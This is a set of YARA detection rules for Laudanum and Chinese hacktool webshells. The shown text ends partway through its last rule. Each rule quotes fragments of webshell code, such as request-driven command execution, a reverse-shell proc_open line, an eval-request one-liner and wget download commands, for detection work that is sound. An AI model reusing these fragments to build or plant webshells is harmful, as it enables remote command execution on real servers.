/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-06-22
	Identifier: Laudanum
*/

rule asp_file {
	meta:
		description = "Laudanum Injector Tools - file file.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "ff5b1a9598735440bdbaa768b524c639e22f53c5"
		id = "e2a80d1f-f2bb-573b-b68c-71e4dfa6e1fa"
	strings:
		$s1 = "' *** Written by Tim Medin <tim@counterhack.com>" fullword ascii
		$s2 = "Response.BinaryWrite(stream.Read)" fullword ascii
		$s3 = "Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "set folder = fso.GetFolder(path)" fullword ascii
		$s6 = "Set file = fso.GetFile(filepath)" fullword ascii
	condition:
		uint16(0) == 0x253c and filesize < 30KB and 5 of them
}

rule php_killnc {
	meta:
		description = "Laudanum Injector Tools - file killnc.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "c0dee56ee68719d5ec39e773621ffe40b144fda5"
		id = "241611d3-3636-5a25-b3c3-d45d6cb81c78"
	strings:
		$s1 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
		$s3 = "<?php echo exec('killall nc');?>" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "<title>Laudanum Kill nc</title>" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "foreach ($allowedIPs as $IP) {" fullword ascii
	condition:
		filesize < 15KB and 4 of them
}

rule asp_shell {
	meta:
		description = "Laudanum Injector Tools - file shell.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "8bf1ff6f8edd45e3102be5f8a1fe030752f45613"
		id = "3ae27254-325a-5358-b5aa-ab24b43ad5a6"
	strings:
		$s1 = "<form action=\"shell.asp\" method=\"POST\" name=\"shell\">" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "%ComSpec% /c dir" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "Set objCmd = wShell.Exec(cmd)" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "Server.ScriptTimeout = 180" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "cmd = Request.Form(\"cmd\")" fullword ascii /* PEStudio Blacklist: strings */
		$s6 = "' ***  http://laudanum.secureideas.net" fullword ascii
		$s7 = "Dim wshell, intReturn, strPResult" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 15KB and 4 of them
}

rule settings {
	meta:
		description = "Laudanum Injector Tools - file settings.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "588739b9e4ef2dbb0b4cf630b73295d8134cc801"
		id = "054b8723-fdfa-51dc-91ae-b915e40b2e54"
	strings:
		$s1 = "Port: <input name=\"port\" type=\"text\" value=\"8888\">" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "<li>Reverse Shell - " fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>" ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 13KB and all of them
}

rule asp_proxy {
	meta:
		description = "Laudanum Injector Tools - file proxy.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "51e97040d1737618b1775578a772fa6c5a31afd8"
		id = "6193b48a-b3da-5c1e-84e8-0035d9e7ade6"
	strings:
		$s1 = "'response.write \"<br/>  -value:\" & request.querystring(key)(j)" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "q = q & \"&\" & key & \"=\" & request.querystring(key)(j)" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "for each i in Split(http.getAllResponseHeaders, vbLf)" fullword ascii
		$s4 = "'urlquery = mid(urltemp, instr(urltemp, \"?\") + 1)" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "s = urlscheme & urlhost & urlport & urlpath" fullword ascii /* PEStudio Blacklist: strings */
		$s6 = "Set http = Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 50KB and all of them
}

rule cfm_shell {
	meta:
		description = "Laudanum Injector Tools - file shell.cfm"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "885e1783b07c73e7d47d3283be303c9719419b92"
		id = "5308eecf-a59f-5100-ab60-5034c5b73e7e"
	strings:
		$s1 = "Executable: <Input type=\"text\" name=\"cmd\" value=\"cmd.exe\"><br>" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "<cfif ( #suppliedCode# neq secretCode )>" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "<cfif IsDefined(\"form.cmd\")>" fullword ascii
	condition:
		filesize < 20KB and 2 of them
}

rule aspx_shell {
	meta:
		description = "Laudanum Injector Tools - file shell.aspx"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "076aa781a004ecb2bf545357fd36dcbafdd68b1a"
		id = "d4287007-79af-59fa-b8c8-3ac08d75b3bd"
	strings:
		$s1 = "remoteIp = HttpContext.Current.Request.Headers[\"X-Forwarded-For\"].Split(new" ascii /* PEStudio Blacklist: strings */
		$s2 = "remoteIp = Request.UserHostAddress;" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "<form method=\"post\" name=\"shell\">" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "<body onload=\"document.shell.c.focus()\">" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 20KB and all of them
}

rule php_shell {
	meta:
		description = "Laudanum Injector Tools - file shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "dc5c03a21267d024ef0f5ab96a34e3f6423dfcd6"
		id = "8d3dcb16-090b-5a9f-b3d2-3822ec467f69"
	strings:
		$s1 = "command_hist[current_line] = document.shell.command.value;" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "array_unshift($_SESSION['history'], $command);" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 40KB and all of them
}

rule php_reverse_shell {
	meta:
		description = "Laudanum Injector Tools - file php-reverse-shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "3ef03bbe3649535a03315dcfc1a1208a09cea49d"
		id = "306d150f-95a8-57fd-8f5e-786c429af6b3"
	strings:
		$s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 15KB and all of them
}

rule php_dns {
	meta:
		description = "Laudanum Injector Tools - file dns.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "01d5d16d876c55d77e094ce2b9c237de43b21a16"
		id = "a52e453b-07aa-58b9-91e7-f2426a8e8976"
	strings:
		$s1 = "$query = isset($_POST['query']) ? $_POST['query'] : '';" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "$result = dns_get_record($query, $types[$type], $authns, $addtl);" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "foreach (array_keys($types) as $t) {" fullword ascii
	condition:
		filesize < 15KB and all of them
}

rule WEB_INF_web {
	meta:
		description = "Laudanum Injector Tools - file web.xml"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "0251baed0a16c451f9d67dddce04a45dc26cb4a3"
		id = "8d0a008c-56d1-59ef-8521-0697add21ba9"
	strings:
		$s1 = "<servlet-name>Command</servlet-name>" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "<jsp-file>/cmd.jsp</jsp-file>" fullword ascii
	condition:
		filesize < 1KB and all of them
}

rule jsp_cmd {
	meta:
		description = "Laudanum Injector Tools - file cmd.war"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "55e4c3dc00cfab7ac16e7cfb53c11b0c01c16d3d"
		id = "74db62b8-82d5-5a34-aa72-2f85053715a4"
	strings:
		$s0 = "cmd.jsp}" fullword ascii
		$s1 = "cmd.jspPK" fullword ascii
		$s2 = "WEB-INF/web.xml" fullword ascii /* Goodware String - occured 1 times */
		$s3 = "WEB-INF/web.xmlPK" fullword ascii /* Goodware String - occured 1 times */
		$s4 = "META-INF/MANIFEST.MF" fullword ascii /* Goodware String - occured 12 times */
	condition:
		uint16(0) == 0x4b50 and filesize < 2KB and all of them
}

rule laudanum {
	meta:
		description = "Laudanum Injector Tools - file laudanum.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "fd498c8b195967db01f68776ff5e36a06c9dfbfe"
		id = "8c836aba-3644-5914-a3ff-937d0a6cd378"
	strings:
		$s1 = "public function __activate()" fullword ascii
		$s2 = "register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 5KB and all of them
}

rule php_file {
	meta:
		description = "Laudanum Injector Tools - file file.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "7421d33e8007c92c8642a36cba7351c7f95a4335"
		id = "68456891-6828-5e42-b8a0-67ecaf83cdc0"
	strings:
		$s1 = "$allowedIPs =" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";" fullword ascii
		$s4 = "$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";" fullword ascii
	condition:
		filesize < 10KB and all of them
}

rule warfiles_cmd {
	meta:
		description = "Laudanum Injector Tools - file cmd.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "3ae3d837e7b362de738cf7fad78eded0dccf601f"
		id = "f974255b-cfbe-57b0-af1f-eddb7f12f5ed"
	strings:
		$s1 = "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
		$s4 = "String disr = dis.readLine();" fullword ascii
	condition:
		filesize < 2KB and all of them
}

rule asp_dns {
	meta:
		description = "Laudanum Injector Tools - file dns.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "5532154dd67800d33dace01103e9b2c4f3d01d51"
		id = "b0e30ca0-7163-5731-98c5-5a1893b8ea80"
	strings:
		$s1 = "command = \"nslookup -type=\" & qtype & \" \" & query " fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "Set objCmd = objWShell.Exec(command)" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "Response.Write command & \"<br>\"" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "<form name=\"dns\" method=\"POST\">" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 21KB and all of them
}

rule php_reverse_shell_2 {
	meta:
		description = "Laudanum Injector Tools - file php-reverse-shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		hash = "025db3c3473413064f0606d93d155c7eb5049c42"
		id = "f10cc33e-0cb6-5d08-af1f-5ef76368de9d"
	strings:
		$s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii /* PEStudio Blacklist: strings */
		$s7 = "$shell = 'uname -a; w; id; /bin/sh -i';" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 10KB and all of them
}

rule Laudanum_Tools_Generic {
	meta:
		description = "Laudanum Injector Tools"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		super_rule = 1
		hash0 = "076aa781a004ecb2bf545357fd36dcbafdd68b1a"
		hash1 = "885e1783b07c73e7d47d3283be303c9719419b92"
		hash2 = "01d5d16d876c55d77e094ce2b9c237de43b21a16"
		hash3 = "7421d33e8007c92c8642a36cba7351c7f95a4335"
		hash4 = "f49291aef9165ee4904d2d8c3cf5a6515ca0794f"
		hash5 = "c0dee56ee68719d5ec39e773621ffe40b144fda5"
		hash6 = "f32b9c2cc3a61fa326e9caebce28ef94a7a00c9a"
		hash7 = "dc5c03a21267d024ef0f5ab96a34e3f6423dfcd6"
		hash8 = "fd498c8b195967db01f68776ff5e36a06c9dfbfe"
		hash9 = "b50ae35fcf767466f6ca25984cc008b7629676b8"
		hash10 = "5570d10244d90ef53b74e2ac287fc657e38200f0"
		hash11 = "42bcb491a11b4703c125daf1747cf2a40a1b36f3"
		hash12 = "83e4eaaa2cf6898d7f83ab80158b64b1d48096f4"
		hash13 = "dec7ea322898690a7f91db9377f035ad7072b8d7"
		hash14 = "a2272b8a4221c6cc373915f0cc555fe55d65ac4d"
		hash15 = "588739b9e4ef2dbb0b4cf630b73295d8134cc801"
		hash16 = "43320dc23fb2ed26b882512e7c0bfdc64e2c1849"
		id = "15738788-5f34-54d0-92fe-f7024c998a54"
	strings:
		$s1 = "***  laudanum@secureideas.net" fullword ascii
		$s2 = "*** Laudanum Project" fullword ascii
	condition:
		filesize < 60KB and all of them
}
/*
    Yara Rule Set
    Author: Florian Roth
    Date: 2015-06-13
    Identifier: CN-Tools Webshells
    Reference: Diclosed hacktool set at http://w2op.us/ (Mirror: http://tools.zjqhr.com)
*/


rule Tools_cmd {
    meta:
        description = "Chinese Hacktool Set - file cmd.jSp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "02e37b95ef670336dc95331ec73dbb5a86f3ba2b"
        id = "27c3cb44-9351-52a2-8e14-afade14e3384"
    strings:
        $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"Conn\"" ascii
        $s2 = "<%@ page import=\"java.io.*\" %>" fullword ascii
        $s3 = "out.print(\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\");" fullword ascii
        $s4 = "while((a=in.read(b))!=-1){" fullword ascii
        $s5 = "out.println(new String(b));" fullword ascii
        $s6 = "out.print(\"</pre>\");" fullword ascii
        $s7 = "out.print(\"<pre>\");" fullword ascii
        $s8 = "int a = -1;" fullword ascii
        $s9 = "byte[] b = new byte[2048];" fullword ascii
    condition:
        filesize < 3KB and 7 of them
}


rule trigger_drop {
    meta:
        description = "Chinese Hacktool Set - file trigger_drop.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "165dd2d82bf87285c8a53ad1ede6d61a90837ba4"
        id = "3b4f32ff-2de2-5689-869a-8a8f55e7fa0c"
    strings:
        $s0 = "$_GET['returnto'] = 'database_properties.php';" fullword ascii
        $s1 = "echo('<meta http-equiv=\"refresh\" content=\"0;url=' . $_GET['returnto'] . '\">'" ascii
        $s2 = "@mssql_query('DROP TRIGGER" ascii
        $s3 = "if(empty($_GET['returnto']))" fullword ascii
    condition:
        filesize < 5KB and all of them
}

rule InjectionParameters {
    meta:
        description = "Chinese Hacktool Set - file InjectionParameters.vb"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "4f11aa5b3660c45e527606ee33de001f4994e1ea"
        id = "a77bd0c6-8857-577f-831a-0fcf2537667e"
    strings:
        $s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
        $s1 = "Public Class InjectionParameters" fullword ascii
    condition:
        filesize < 13KB and all of them
}

rule users_list {
    meta:
        description = "Chinese Hacktool Set - file users_list.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "6fba1a1a607198ed232405ccbebf9543037a63ef"
        id = "2d90b593-6b65-502c-aeb0-8f2a3d65afd3"
    strings:
        $s0 = "<a href=\"users_create.php\">Create User</a>" fullword ascii
        $s7 = "$skiplist = array('##MS_AgentSigningCertificate##','NT AUTHORITY\\NETWORK SERVIC" ascii
        $s11 = "&nbsp;<b>Default DB</b>&nbsp;" fullword ascii
    condition:
        filesize < 12KB and all of them
}

rule trigger_modify {
    meta:
        description = "Chinese Hacktool Set - file trigger_modify.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "c93cd7a6c3f962381e9bf2b511db9b1639a22de0"
        id = "a7d65a9f-82de-554c-8f20-7560d2160041"
    strings:
        $s1 = "<form name=\"form1\" method=\"post\" action=\"trigger_modify.php?trigger=<?php e" ascii
        $s2 = "$data_query = @mssql_query('sp_helptext \\'' . urldecode($_GET['trigger']) . '" ascii
        $s3 = "if($_POST['query'] != '')" fullword ascii
        $s4 = "$lines[] = 'I am unable to read this trigger.';" fullword ascii
        $s5 = "<b>Modify Trigger</b>" fullword ascii
    condition:
        filesize < 15KB and all of them
}

rule Customize {
    meta:
        description = "Chinese Hacktool Set - file Customize.aspx"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "db556879dff9a0101a7a26260a5d0dc471242af2"
        id = "a69e1234-cc85-5295-a45c-693afdfc368e"
    strings:
        $s1 = "ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex" ascii
        $s2 = "c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr" ascii
        $s3 = "Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create" ascii
        $s4 = "R=\"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";}Conn.Close();break;" ascii
    condition:
        filesize < 24KB and all of them
}

rule oracle_data {
    meta:
        description = "Chinese Hacktool Set - file oracle_data.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "6cf070017be117eace4752650ba6cf96d67d2106"
        id = "faa62dcc-0f59-573c-8722-d07216de151f"
    strings:
        $s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
        $s1 = "if(isset($_REQUEST['id']))" fullword ascii
        $s2 = "$id=$_REQUEST['id'];" fullword ascii
    condition:
        all of them
}

rule reDuhServers_reDuh {
    meta:
        description = "Chinese Hacktool Set - file reDuh.jsp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "377886490a86290de53d696864e41d6a547223b0"
        id = "c87d971a-a16f-5593-88fb-6bcd207e0841"
    strings:
        $s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
        $s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
        $s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
    condition:
        filesize < 116KB and all of them
}

rule item_old {
    meta:
        description = "Chinese Hacktool Set - file item-old.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "daae358bde97e534bc7f2b0134775b47ef57e1da"
        id = "c32bbd48-a363-53c7-84c6-c47581e2f9da"
    strings:
        $s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
        $s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
        $s3 = "$sHash = md5($sURL);" fullword ascii
    condition:
        filesize < 7KB and 2 of them
}

rule Tools_2014 {
    meta:
        description = "Chinese Hacktool Set - file 2014.jsp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "74518faf08637c53095697071db09d34dbe8d676"
        id = "bb76321b-003d-5f6b-a84b-425477abe91c"
    strings:
        $s0 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
    condition:
        filesize < 715KB and all of them
}

rule reDuhServers_reDuh_2 {
    meta:
        description = "Chinese Hacktool Set - file reDuh.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "512d0a3e7bb7056338ad0167f485a8a6fa1532a3"
        id = "6050dfde-6c79-5dd8-a772-508668177aa5"
    strings:
        $s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
        $s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
        $s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
    condition:
        filesize < 57KB and all of them
}

rule Customize_2 {
    meta:
        description = "Chinese Hacktool Set - file Customize.jsp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "37cd17543e14109d3785093e150652032a85d734"
        id = "1f7e9063-33d8-5df4-89d5-7d8fc1be61f0"
    strings:
        $s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
        $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
    condition:
        filesize < 30KB and all of them
}

rule ChinaChopper_one {
    meta:
        description = "Chinese Hacktool Set - file one.asp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "6cd28163be831a58223820e7abe43d5eacb14109"
        id = "854fb5c9-38c7-5fd2-a473-66ae297070f5"
    strings:
        $s0 = "<%eval request(" ascii
    condition:
        filesize < 50 and all of them
}

rule CN_Tools_old {
    meta:
        description = "Chinese Hacktool Set - file old.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "f8a007758fda8aa1c0af3c43f3d7e3186a9ff307"
        id = "bfdb84e8-e5a8-53a4-ae71-e0d1b38d38ef"
    strings:
        $s0 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
        $s1 = "$sURL = \"http://\".$sServer.\"/\".$sFile;" fullword ascii
        $s2 = "chmod(\"/\".substr($sHash, 0, 2), 0777);" fullword ascii
        $s3 = "$sCmd = \"echo 123> \".$sFileOut;" fullword ascii
    condition:
        filesize < 6KB and all of them
}

rule item_301 {
    meta:
        description = "Chinese Hacktool Set - file item-301.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "15636f0e7dc062437608c1f22b1d39fa15ab2136"
        id = "4ee9a089-313f-53c1-8196-1348d721dbf4"
    strings:
        $s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
        $s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
        $s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
        $s4 = "$sURL = $aArg[0];" fullword ascii
    condition:
        filesize < 3KB and 3 of them
}

rule CN_Tools_item {
    meta:
        description = "Chinese Hacktool Set - file item.php"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "a584db17ad93f88e56fd14090fae388558be08e4"
        id = "954f24c9-d7d5-56d3-86f0-0cf8832640dd"
    strings:
        $s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s3 = "$sWget=\"index.asp\";" fullword ascii
        $s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii
    condition:
        filesize < 4KB and all of them
}

rule f3_diy {
    meta:
        description = "Chinese Hacktool Set - file diy.asp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "f39c2f64abe5e86d8d36dbb7b1921c7eab63bec9"
        id = "9f36c6dd-89e8-511b-a499-131f1e8a420a"
    strings:
        $s0 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
        $s5 = ".black {" fullword ascii
    condition:
        uint16(0) == 0x253c and filesize < 10KB and all of them
}

rule ChinaChopper_temp {
    meta:
        description = "Chinese Hacktool Set - file temp.asp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "http://tools.zjqhr.com/"
        date = "2015-06-13"
        hash = "b0561ea52331c794977d69704345717b4eb0a2a7"
        id = "f163787f-fcc9-568a-a12d-4057cb4f0d29"
    strings:
        $s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
        $s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
